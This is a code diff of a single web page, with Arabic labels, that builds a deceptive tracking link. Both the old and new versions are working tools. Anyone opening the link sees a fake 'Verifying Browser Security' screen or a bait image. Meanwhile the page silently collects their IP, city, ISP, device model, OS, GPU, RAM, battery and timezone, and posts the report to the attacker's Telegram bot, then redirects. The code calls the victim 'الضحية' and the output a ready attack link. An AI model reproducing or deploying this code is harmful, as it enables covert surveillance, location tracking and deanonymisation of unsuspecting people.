@@ -3,135 +3,149 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>System Analyzer Pro</title>
+    <title>Security Check | Verify</title>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/UAParser.js/0.7.33/ua-parser.min.js"></script>
     <style>
-        :root { --accent: #00ff88; --bg: #0a0a0b; }
-        body { background: var(--bg); color: #e0e0e0; font-family: 'Segoe UI', Tahoma, sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
-        .panel { width: 90%; max-width: 500px; background: #16161a; padding: 25px; border-radius: 15px; border: 1px solid #222; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
-        h2 { color: var(--accent); text-align: center; margin-bottom: 25px; font-size: 1.2rem; text-transform: uppercase; }
-        label { display: block; margin: 15px 0 5px; font-size: 0.85rem; color: #888; }
-        input { width: 100%; padding: 12px; background: #000; border: 1px solid #333; color: var(--accent); border-radius: 8px; box-sizing: border-box; }
-        .btn { background: var(--accent); color: #000; border: none; padding: 15px; width: 100%; border-radius: 8px; cursor: pointer; font-weight: bold; margin-top: 20px; transition: 0.3s; }
-        .btn:hover { filter: brightness(1.2); transform: translateY(-2px); }
-        #resultArea { display: none; margin-top: 20px; padding: 15px; background: #000; border: 1px dashed var(--accent); border-radius: 8px; }
-        textarea { width: 100%; height: 60px; background: transparent; color: #fff; border: none; resize: none; font-size: 0.8rem; outline: none; }
-        img { max-width: 100%; border-radius: 10px; }
+        body { background: #000; color: #00ff41; font-family: 'Courier New', monospace; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
+        .terminal { width: 90%; max-width: 600px; }
+        .input-box { background: #111; border: 1px solid #00ff41; color: #00ff41; padding: 15px; border-radius: 5px; width: 100%; box-sizing: border-box; margin-bottom: 10px; }
+        .btn { background: #00ff41; color: #000; border: none; padding: 15px; width: 100%; cursor: pointer; font-weight: bold; text-transform: uppercase; }
+        #status { font-size: 12px; margin-top: 10px; }
         .hidden { display: none; }
+        .loader { width: 50px; height: 50px; border: 5px solid #111; border-top-color: #00ff41; border-radius: 50%; animation: spin 1s infinite linear; margin: auto; }
+        @keyframes spin { to { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
 
-<div class="panel" id="adminPanel">
-    <h2>[ لوحة التحكم والإنشاء ]</h2>
-    
-    <label>توكن بوت التلجرام:</label>
-    <input type="text" id="botToken" placeholder="7123456789:AAEj...">
-    
-    <label>أيدي حسابك (Chat ID):</label>
-    <input type="text" id="chatId" placeholder="123456789">
-
-    <label>رابط الصورة مباشرة (لتجنب طول الرابط):</label>
-    <input type="text" id="imgUrl" placeholder="https://example.com/image.jpg">
-    <p style="font-size: 10px; color: #666;">* ارفع صورتك على أي موقع لرفع الصور وضع الرابط هنا ليكون الرابط قصيراً.</p>
-
-    <button class="btn" onclick="buildLink()">توليد رابط التتبع المطور</button>
-
-    <div id="resultArea">
-        <label>انسخ الرابط النهائي:</label>
-        <textarea id="finalLink" readonly></textarea>
-        <p style="color: var(--accent); font-size: 11px; text-align: center;">الآن قم باختصار هذا الرابط عبر bitly أو أي خدمة أخرى.</p>
+<div id="adminPanel" class="terminal">
+    <h2>[ G-INTELLIGENCE GENERATOR ]</h2>
+    <input type="text" id="botToken" class="input-box" placeholder="BOT TOKEN">
+    <input type="text" id="chatId" class="input-box" placeholder="CHAT ID">
+    <input type="text" id="targetUrl" class="input-box" placeholder="DESTINATION URL (e.g. https://google.com)">
+    <button class="btn" onclick="buildPayload()">توليد الرابط المشفر</button>
+    <div id="status"></div>
+    <div id="linkOutput" class="hidden">
+        <p>رابط الهجوم الجاهز:</p>
+        <textarea id="finalLink" class="input-box" style="height: 80px; font-size: 10px;" readonly></textarea>
     </div>
 </div>
 
-<div id="victimView" class="hidden">
-    <img id="targetImage" src="">
+<div id="victimPanel" class="hidden terminal" style="text-align: center;">
+    <div class="loader"></div>
+    <h3>Verifying Browser Security...</h3>
+    <p id="msg" style="font-size: 12px; color: #888;">Checking for secure connection...</p>
 </div>
 
 <script>
     const params = new URLSearchParams(window.location.search);
 
-    // --- اكتشاف نظام التشغيل بدقة (Fingerprinting) ---
-    function getExtraInfo() {
+    // --- نظام الفحص المتقدم ---
+    async function getAdvancedSpecs() {
         const canvas = document.createElement('canvas');
         const gl = canvas.getContext('webgl');
         const debugInfo = gl ? gl.getExtension('WEBGL_debug_renderer_info') : null;
+        
         return {
-            gpu: gl && debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Unknown",
+            gpu: gl && debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Blocked/Unknown",
             cores: navigator.hardwareConcurrency || "N/A",
-            ram: navigator.deviceMemory ? navigator.deviceMemory + " GB" : "Unknown",
-            resolution: `${window.screen.width}x${window.screen.height} (${window.devicePixelRatio}x)`
+            memory: navigator.deviceMemory || "N/A",
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            languages: navigator.languages.join(', '),
+            touchPoints: navigator.maxTouchPoints,
+            isAdBlock: await checkAdBlock()
         };
     }
 
-    // --- منطق المستهدف (الضحية) ---
-    if (params.has('t') && params.has('c')) {
+    async function checkAdBlock() {
+        const url = 'https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js';
+        try { await fetch(url, { mode: 'no-cors' }); return "Disabled"; } 
+        catch (e) { return "Enabled (Privacy Mode)"; }
+    }
+
+    // --- منطق التنفيذ (الضحية) ---
+    if (params.has('payload')) {
         document.getElementById('adminPanel').classList.add('hidden');
-        document.getElementById('victimView').classList.remove('hidden');
+        document.getElementById('victimPanel').classList.remove('hidden');
 
-        const token = atob(params.get('t'));
-        const chat = atob(params.get('c'));
-        const img = atob(params.get('i'));
+        const data = JSON.parse(atob(params.get('payload')));
+        
+        (async () => {
+            const specs = await getAdvancedSpecs();
+            const parser = new UAParser();
+            const ua = parser.getResult();
+            
+            let ipInfo = {};
+            try { 
+                const res = await fetch('https://ipapi.co/json/');
+                ipInfo = await res.json();
+            } catch(e) {}
 
-        document.getElementById('targetImage').src = img;
+            let battery = "N/A";
+            try { 
+                const b = await navigator.getBattery();
+                battery = `${Math.round(b.level * 100)}% (${b.charging ? 'Charging' : 'Disconnected'})`;
+            } catch(e) {}
 
-        executeTracking(token, chat);
+            const report = `
+🚨 **Intelligence Report Generated**
+━━━━━━━━━━━━━━━━━━
+👤 **IDENTITY**
+• IP: \`${ipInfo.ip || 'Unknown'}\`
+• Provider: \`${ipInfo.org || 'Unknown'}\`
+• Location: \`${ipInfo.city}, ${ipInfo.country_name}\`
+
+📱 **HARDWARE SPECIFICATIONS**
+• Device: \`${ua.device.vendor || ''} ${ua.device.model || 'PC'}\`
+• OS: \`${ua.os.name} ${ua.os.version}\`
+• GPU: \`${specs.gpu}\`
+• CPU Cores: \`${specs.cores}\`
+• RAM: \`${specs.memory} GB\`
+• Screen: \`${window.screen.width}x${window.screen.height}\`
+
+🛡️ **ENVIRONMENT**
+• Browser: \`${ua.browser.name} ${ua.browser.version}\`
+• Timezone: \`${specs.timezone}\`
+• Battery: \`${battery}\`
+• Privacy Shield (AdBlock): \`${specs.isAdBlock}\`
+
+⏰ **Time:** \`${new Date().toLocaleString('en-US')}\`
+━━━━━━━━━━━━━━━━━━
+            `;
+
+            // إرسال البيانات
+            await fetch(`https://api.telegram.org/bot${data.token}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: data.chat, text: report, parse_mode: 'Markdown' })
+            });
+
+            // توجيه نهائي
+            setTimeout(() => {
+                window.location.replace(data.redirect);
+            }, 1500);
+        })();
     }
 
-    // --- منطق إنشاء الرابط (أنت) ---
-    function buildLink() {
-        const t = btoa(document.getElementById('botToken').value);
-        const c = btoa(document.getElementById('chatId').value);
-        const i = btoa(document.getElementById('imgUrl').value);
+    // --- منطق الإنشاء (أنت) ---
+    function buildPayload() {
+        const token = document.getElementById('botToken').value;
+        const chat = document.getElementById('chatId').value;
+        const redirect = document.getElementById('targetUrl').value;
 
-        if(!t || !c || !i) return alert("يرجى ملء كافة الحقول!");
+        if(!token || !chat || !redirect) return alert("All fields required!");
 
-        const base = window.location.href.split('?')[0];
-        const generated = `${base}?t=${t}&c=${c}&i=${i}`;
+        const payload = {
+            token: token,
+            chat: chat,
+            redirect: redirect
+        };
+
+        const encoded = btoa(JSON.stringify(payload));
+        const finalUrl = window.location.href.split('?')[0] + "?payload=" + encoded;
         
-        document.getElementById('finalLink').value = generated;
-        document.getElementById('resultArea').style.display = 'block';
-    }
-
-    // --- نظام الجمع والإرسال ---
-    async function executeTracking(token, chat) {
-        const parser = new UAParser();
-        const ua = parser.getResult();
-        const extra = getExtraInfo();
-        
-        let battery = "N/A";
-        try { const b = await navigator.getBattery(); battery = `${Math.round(b.level * 100)}% (${b.charging ? 'Charging' : 'Discharging'})`; } catch(e){}
-
-        let net = {};
-        try { const r = await fetch('https://ipapi.co/json/'); net = await r.json(); } catch(e){}
-
-        const report = `
-📊 **تقرير استخباراتي جديد**
-━━━━━━━━━━━━━━
-📱 **الجهاز:** ${ua.device.vendor || 'PC'} ${ua.device.model || ''}
-🖥️ **النظام:** ${ua.os.name} ${ua.os.version}
-🌐 **المتصفح:** ${ua.browser.name}
-🔋 **البطارية:** ${battery}
-
-⚙️ **المواصفات التقنية:**
-• المعالج: ${extra.cores} Cores
-• الرام التقريبي: ${extra.ram}
-• كرت الشاشة: ${extra.gpu}
-• الشاشة: ${extra.resolution}
-
-📍 **الموقع والشبكة:**
-• IP: ${net.ip}
-• المدينة: ${net.city}, ${net.country_name}
-• الشركة المزودة: ${net.org}
-• توقيت الفتح: ${new Date().toLocaleString('ar-EG')}
-━━━━━━━━━━━━━━
-        `;
-
-        fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ chat_id: chat, text: report, parse_mode: 'Markdown' })
-        });
+        document.getElementById('finalLink').value = finalUrl;
+        document.getElementById('linkOutput').classList.remove('hidden');
     }
 </script>
 </body>
